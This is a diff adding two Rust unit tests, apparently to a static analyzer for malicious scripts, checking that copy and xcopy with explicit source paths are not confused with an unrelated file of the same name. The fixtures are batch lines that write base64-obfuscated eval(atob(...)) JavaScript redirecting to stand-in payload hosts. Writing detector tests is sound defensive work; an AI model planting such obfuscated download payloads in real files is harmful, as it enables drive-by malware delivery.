@@ -13426,6 +13426,50 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copy_explicit_source_path_does_not_use_unrelated_basename_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS13cm9uZy1iYXNlbmFtZS5leGFtcGxlL3BheWxvYWQn")) > D:\Other\original.js
+copy C:\Work\original.js renamed.js
+call renamed.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://copy-wrong-basename.example/payload"
+                )
+            }),
+            "copy explicit source path reused unrelated basename content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn xcopy_explicit_source_path_does_not_use_unrelated_basename_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veGNvcHktd3JvbmctYmFzZW5hbWUuZXhhbXBsZS9wYXlsb2FkJw==")) > D:\Other\original.js
+xcopy /y C:\Work\original.js renamed.js
+call renamed.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::Download { src, .. }
+                        if src == "https://xcopy-wrong-basename.example/payload"
+                )
+            }),
+            "xcopy explicit source path reused unrelated basename content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn move_directory_destination_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
